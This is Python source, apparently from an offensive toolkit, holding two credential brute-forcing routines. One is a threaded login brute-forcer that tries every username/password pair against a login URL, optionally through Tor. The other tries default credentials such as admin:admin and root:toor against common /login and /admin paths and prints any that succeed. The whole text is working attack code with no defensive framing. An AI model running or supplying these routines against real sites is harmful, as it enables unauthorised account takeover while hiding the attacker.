from core.utils import create_session
from concurrent.futures import ThreadPoolExecutor
import requests


def brute_force_login(login_url, username_list, password_list, use_tor=False, threads=10):
    session = create_session(use_tor)
    valid_credentials = []
    
    def try_login(username, password):
        data = {
            'username': username,
            'password': password
        }
        try:
            response = session.post(login_url, data=data)
            if response.status_code == 200 and "login" not in response.text.lower():
                valid_credentials.append((username, password))
        except:
            pass
    
    # Create a list of all combinations
    tasks = []
    for username in username_list:
        for password in password_list:
            tasks.append((username, password))
    
    # Use thread pool to execute
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for username, password in tasks:
            executor.submit(try_login, username, password)
    
    return valid_credentials
# modules/brute_force.py
import requests

def run_brute_force(url, logger):
    login_paths = ["/login", "/admin", "/admin/login"]
    credentials = [("admin", "admin"), ("root", "toor"), ("user", "123456")]

    for path in login_paths:
        full_url = url.rstrip("/") + path
        logger.info(f"Trying login path: {full_url}")

        for username, password in credentials:
            try:
                r = requests.post(full_url, data={
                    "username": username,
                    "password": password
                }, timeout=5)

                if r.status_code == 200 and "invalid" not in r.text.lower():
                    logger.info(f"✔ Valid login: {username}:{password}")
                    print(f"[+] Found: {username}:{password} at {full_url}")
                    return
                else:
                    logger.info(f"✘ Failed: {username}:{password}")
            except Exception as e:
                logger.error(f"Error connecting to {full_url}: {e}")
